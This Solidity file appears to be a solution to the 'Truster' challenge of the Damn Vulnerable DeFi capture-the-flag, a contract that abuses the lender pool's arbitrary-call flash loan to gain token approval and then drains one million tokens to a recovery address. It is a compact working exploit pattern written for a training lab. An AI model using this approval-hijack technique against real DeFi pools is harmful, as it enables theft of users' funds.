// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract Target {

    address destination;
    TrusterLenderPool trusterPool;
    DamnValuableToken dvt;

    constructor(address pool, address recovery, address token){
        trusterPool = TrusterLenderPool(pool);
        dvt = DamnValuableToken(token);
        destination = recovery;
    }

    function rescueTokens(uint256 amount, address borrower, address target, bytes calldata data) public {

        trusterPool.flashLoan(amount, borrower, target, data);

        dvt.transferFrom(address(trusterPool), destination, 1_000_000e18);
    }
}